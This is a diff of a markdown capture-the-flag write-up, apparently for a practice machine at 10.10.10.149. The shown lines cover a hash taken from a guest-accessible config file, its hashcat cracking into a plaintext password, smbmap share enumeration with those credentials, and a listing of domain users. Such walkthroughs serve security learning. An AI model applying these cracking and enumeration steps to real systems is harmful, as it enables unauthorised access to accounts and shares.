@@ -61,10 +61,12 @@ HOP RTT       ADDRESS
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 60.96 seconds
 ```
+## Logging in as guest user
 Logging in as guest gives config.txt file.
 ![[Pasted image 20210711013543.png]]
 This file contains hash `$1$pdQG$o8nrSzsGXeaduXrjlvKc91` which when cracked using hashcat gives `stealth1agent` using command `hashcat -m 500 hash.hash /content/drive/MyDrive/rockyou.txt`.
 http://10.10.10.149/issues.php webpage has a user `Hazard` which can be used with cracked hash to access shares of user `Hazard`.
+![[Pasted image 20210711055724.png]]
 `smbmap` can be used to know the shares of `Hazard` user.
 ```bash
 ❯ smbmap -H 10.10.10.149 -u Hazard -p stealth1agent
@@ -93,6 +95,6 @@ Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
 1012: SUPPORTDESK\Chase (SidTypeUser)
 1013: SUPPORTDESK\Jason (SidTypeUser)
 ```
-
+#
 
 
